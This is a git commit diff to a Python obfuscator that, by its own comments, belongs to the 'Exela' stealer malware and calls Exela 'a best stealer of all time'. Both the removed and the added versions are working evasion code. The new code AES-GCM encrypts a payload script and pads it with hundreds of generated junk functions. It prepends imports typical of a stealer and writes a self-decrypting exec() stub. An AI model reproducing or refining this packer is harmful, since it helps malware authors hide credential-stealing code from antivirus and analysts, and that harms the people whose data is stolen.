c6ba34be1f210c9403fc65aa5724af2423403e01
quicaxd <127431653+quicaxd@users.noreply.github.com>
2023-10-25 19:43:28 +0300

    Update obf.py

--- Obfuscator/obf.py
+++ Obfuscator/obf.py
@@ -1,48 +1,91 @@
+import string
 import argparse
-from cryptography.fernet import Fernet
-import base64
 import random
-import marshal
-import zlib
+import os
+import time
+import base64
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
-parser = argparse.ArgumentParser(description="Python Code Obfuscator")
-parser.add_argument("file", help="Enter the file name containing the Python code to obfuscate")
-parser.add_argument("--junk", action="store_true", help="Inject junk code into the obfuscated code")
-
-args = parser.parse_args()
-
-with open(args.file, encoding="utf-8") as file:
-    data = file.read()
-
-
-original_code = data
-
-obfuscated = base64.b64encode(base64.b32encode(zlib.compress(marshal.dumps(original_code.encode()))))[::-1]
-
-gotobase64 = base64.b64encode(obfuscated)
-
-gotobase64x2 = base64.b64encode(gotobase64)
-
-gotobase32 = base64.b32encode(gotobase64x2)
-
-gotobase64x3 = base64.b64encode(gotobase32)
-
-randomnum = random.randint(10, 500)
-
-randomnum2 = random.randint(10, 500)
-
-randomnum3 = random.randint(10, 500)
-
-randomnum4 = random.randint(10, 500)
-
-randomnum5 = random.randint(10, 500)
+Exela_Modules = "import ctypes, platform ,json, sys, shutil, sqlite3\nimport re, os, asyncio, aiohttp, time, base64\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend"
+Decrypt_Func_Script = """
+def DecryptString(key, tag, nonce, _input) -> str:
+    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag))
+    decryptor = cipher.decryptor()
+    decrypted_data = decryptor.update(_input) + decryptor.finalize()
+    return decrypted_data.decode(errors="ignore")
+"""
 
 
-def genjunk():
-    return f"""
-def saint{random.randint(99999, 9999999)}():
+class Obfuscate:
+    def __init__(self, file_path: str, output_path: str) -> None:
+        self.file_path = file_path
+        self.output_path = output_path
+        self.nonce = b"your_nonce_here"
+        self.kdf = PBKDF2HMAC(
+            algorithm=hashes.SHA256(),
+            iterations=100000,  # İterasyon sayısı ayarlanabilir
+            salt=b"salt_string",  # Rastgele bir tuz
+            length=32,  # Anahtar uzunluğu (256 bit)
+        )
+        self.key = self.kdf.derive(os.urandom(random.randint(10, 20)))
+        self.tag = bytes()
+
+    def Main(self) -> None:
+        if not os.path.exists(self.file_path):
+            print("the file does not exist:()")
+            exit(0)
+        junk_code = self.GenerateJunkCode()
+        commands = self.GenerateCommandLines()
+        for f in range(200):
+            junk_code += self.GenerateJunkCode()
+            commands += self.GenerateCommandLines()
+        with open(self.file_path, "rb") as file:
+            data = file.read()
+        encrypted_data, tag = self.EncryptString(data)
+        with open(self.output_path, "w", errors="ignore") as file:
+            file.write(Exela_Modules)
+            file.write(commands)
+            file.write(junk_code)
+            file.write(f"\n{Decrypt_Func_Script}\n\n")
+        with open(self.output_path, "ab") as file:
+            file.write(b"key = base64.b64decode('" + base64.b64encode(self.key) + b"')")
+            file.write(
+                b"\ntag = base64.b64decode('" + base64.b64encode(self.tag) + b"')"
+            )
+            file.write(
+                b"\nnonce = base64.b64decode('" + base64.b64encode(self.nonce) + b"')"
+            )
+            file.write(
+                b"\nencrypted_data = base64.b64decode('"
+                + base64.b64encode(encrypted_data)
+                + b"')\n"
+            )
+            file.write(
+                b"exec(DecryptString(key, tag, nonce, encrypted_data))\n# coded by quicaxd\n#Exela is a best stealer of all time\n#thanks for using exela\n"
+            )
+
+    def EncryptString(self, _input):
+        cipher = Cipher(algorithms.AES(self.key), modes.GCM(self.nonce))
+        encryptor = cipher.encryptor()
+        encrypted_data = encryptor.update(_input) + encryptor.finalize()
+        tag = encryptor.tag
+        self.tag = tag
+        return (encrypted_data, tag)
+
+    def DecryptString(self, _input, tag) -> str:
+        cipher = Cipher(algorithms.AES(self.key), modes.GCM(self.nonce, tag))
+        decryptor = cipher.decryptor()
+        decrypted_data = decryptor.update(_input) + decryptor.finalize()
+
+        return decrypted_data
+
+    def GenerateJunkCode(self) -> str:  # default 50
+        data = f"""
+def {self.GenerateRandomString(8)}{random.randint(99999, 9999999)}():
     if {random.randint(99999, 9999999)} == {random.randint(99999, 9999999)}:
-    
+
         print({random.randint(99999, 9999999)})
         aaa{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
 
@@ -58,7 +101,7 @@ def saint{random.randint(99999, 9999999)}():
         cc{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
 
     elif {random.randint(99999, 9999999)} == {random.randint(99999, 9999999)}:
-    
+
         print({random.randint(99999, 9999999)})
 
         aaa{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
@@ -71,37 +114,34 @@ def saint{random.randint(99999, 9999999)}():
 
         a{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
         aa{random.randint(99999, 9999999)} = {random.randint(99999, 9999999)}
-    """
+        """
 
-def junkgenerator(junkrange):
-    junks = ''
-    for a in range(junkrange):
-        junks += genjunk()
-    return junks
+        return data
 
+    def GenerateCommandLines(self) -> str:
+        junk_comment_line = f"""
+# {self.GenerateRandomString(15)}
+        """
+        return junk_comment_line
 
-stubkey = Fernet.generate_key()
+    def GenerateRandomString(self, length: int) -> str:
+        characters = string.ascii_letters + string.digits
 
-cipher = Fernet(stubkey)
+        first_char = random.choice(string.ascii_letters)
+        rest_of_chars = "".join(random.choices(characters, k=length - 1))
 
-encrypted_data = cipher.encrypt(gotobase64x3)
-
-newdata = encrypted_data.decode()
-
-hex_str = newdata.encode().hex()
-
-
-stub = f"""import ctypes,json,sys,base64,shutil,sqlite3\nimport platform, re, os, asyncio, aiohttp, base64, time\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend\n\n__VareObfuscator__ = ''
-{junkgenerator(100)}
-import base64 as ______;import marshal as ____;import zlib as __________;from cryptography.fernet import Fernet;import base64;__mikey__="{base64.b64encode(stubkey).decode()}";mydata="{hex_str}";__vare__ = lambda x: ____.loads(__________.decompress(______.b32decode(______.b64decode(x[::-1]))));__mycip__= Fernet(base64.b64decode(__mikey__));__step1__=bytes.fromhex(mydata);__step2__=__mycip__.decrypt(__step1__);__decr__=base64.b64decode(__step2__);__decrdata__=__decr__;__gotnew__=base64.b32decode(__decr__);__newdecr__={random.randint(999999,999999999999)};__getnew__=__newdecr__;__myb64code__=base64.b64decode(__gotnew__);__myb64codee__=base64.b64decode(__myb64code__);___ = __myb64codee__;exec(__vare__(___))
-{junkgenerator(100)}"""
+        return first_char + rest_of_chars
 
 
-stub2 = f"""__VareObfuscator__ = ''
-import base64 as ______;import marshal as ____;import zlib as __________;from cryptography.fernet import Fernet;import base64;__mikey__="{base64.b64encode(stubkey).decode()}";mydata="{hex_str}";__vare__ = lambda x: ____.loads(__________.decompress(______.b32decode(______.b64decode(x[::-1]))));__mycip__= Fernet(base64.b64decode(__mikey__));__step1__=bytes.fromhex(mydata);__step2__=__mycip__.decrypt(__step1__);__decr__=base64.b64decode(__step2__);__decrdata__=__decr__;__gotnew__=base64.b32decode(__decr__);__newdecr__={random.randint(999999,999999999999)};__getnew__=__newdecr__;__myb64code__=base64.b64decode(__gotnew__);__myb64codee__=base64.b64decode(__myb64code__);___ = __myb64codee__;exec(__vare__(___))"""
-
-
-with open('stub.py', "w", encoding="utf-8", errors="ignore") as file:
-    file.write(stub)
-print("File obfuscated Succesfully.\n")
-
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(
+        description="Obfuscate a data using AES-GCM encryption."
+    )
+    parser.add_argument("file_path", type=str, help="file to obfuscate")
+    parser.add_argument("output_path", type=str, help="output file")
+    args = parser.parse_args()
+    t = time.time()
+    Obfuscator = Obfuscate(args.file_path, args.output_path)
+    for f in range(3):  # obfuscate for 3 time u can make 15000 xd
+        Obfuscator.Main()
+    print(f"The code obfuscated on {str(time.time() - t)} second")
